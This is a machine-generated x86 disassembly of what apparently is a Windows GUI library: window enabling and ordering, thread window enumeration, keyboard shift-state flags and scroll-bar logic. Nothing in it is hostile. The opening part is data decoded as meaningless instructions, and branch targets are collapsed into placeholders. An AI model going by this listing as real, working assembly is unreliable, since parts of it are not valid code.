add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
jmp edx
sub_44b336
inc esp
add [ eax ] ah
mov es [ ebx ]
and al 0x8e
inc ebx
add [ esi + esi * 8 - 0x737bffbc ] ah
inc ebx
add ah bh
mov eax 0xfd980043
inc esp
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ edx + edx - 0x37cfffbb ] ch
inc esp
add al ah
0x44
sub_44b398
mov edi 0xc0ffbdff
sbb eax 0x1de80045
inc ebp
add [ eax - 0x27ffbae2 ] al
push ds
inc ebp
add [ edi + ebx + 0x1fc40045 ] ch
inc ebp
add [ esp + ebx + 0x45 ] al
add [ eax ] ch
sbb eax 0x1d940045
inc ebp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov ah 0x44
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
call 0xffffffff9444f45d
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
add [ eax ] al
add [ esp + esi * 4 + 0x44 ] ch
aam 0xb3
inc esp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
xor eax [ eax ]
test al 0x33
add [ eax - 0x5bffbfcd ] ah
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
xchg esp eax
mov dl 0x44
add [ esp + 0xe0044 ] al
add eax 0x6d726f46
jae r-xdata
cmp al 0x10
inc eax
add [ eax ] bl
in eax dx
inc esp
add [ ebp * 8 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69500d00
js r-xdata
add [ eax + edx ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
mov ah 0x44
add [ esi * 4 + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
mov ch 0x44
add [ eax - 0x1c000000 ] ah
push ebx
inc ecx
add [ eax ] ch
int3
insb
jae r-xdata
xor [ eax ] eax
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xc400408d
mov ah 0x44
jb r-xdata
xor [ eax ] eax
push esp
outsb
arpl [ eax - 0x70 ] bp
insb
mov ah 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_44b648
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44b694
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_454d94
mov eax [ rw-data ]
call sub_41c758
mov eax [ rw-data ]
call sub_41c700
retn
push 0x0
push eax
call ShowOwnedPopups
sub_44b6cc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_402734
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44b71c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_44b7bf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4035ec#9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44b6cc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7c6
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44b7d0
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402754
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44b808
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44b86c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44b808
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44b8c8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44b8e8
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_44b8c8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_44b914
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_452374
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4527e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c80
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_452360
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4527d0
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c80
test eax eax
je r-xdata
sub_44b994
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44b9e8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_44ba24
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_44ba70
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bace
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44962c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404084
mov eax [ ebp - 0x8 ]
pop edx
call sub_407c80
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bad5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
sub_44bae0
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_44bb08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_44bb79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44bae0
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bb80
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
sub_44bb88
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403134
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44bc18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4170bc
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_44c4e0
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_44c4c0
mov edx [ edi + 0xc ]
mov eax ebx
call sub_44c370
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44bc68
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44be20
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_435774
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_44c370
xor edx edx
mov eax ebx
call sub_44c370
jmp r-xdata
sub_44bca0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424db4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44bd0c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424db4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_44bd74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_44c4a8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_438618
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_44c4a8
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4385dc
call sub_44bd0c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4385dc
call sub_44bca0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_44be20
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_43b8e8
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44be58
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_44be8c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44be58
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_44be58
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_44bf08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_44be8c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434b10
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_44be8c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_434b54
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44bfa0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_44c000
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_44c1d1 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44bf08
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44bf08
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c370
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
push ebp
call sub_44bfa0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
push ebp
call sub_44bfa0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_40699c
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44c370
jmp r-xdata
sub_44c2f8
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44c9e8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_44c370
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_43b8e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_43b8e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_43b4a0
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_43b4a0
jmp r-xdata
call sub_44bae0
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44c434
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_44c9e8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_44c4ec
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
call sub_4269d4
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
call sub_4269d4
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
call sub_4269d4
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41f034
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
call sub_4269d4
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_43b8e8
push eax
call sub_4269d4
sub_44c5f4
push ebp
mov ebp esp
add esp 0xffffffdc
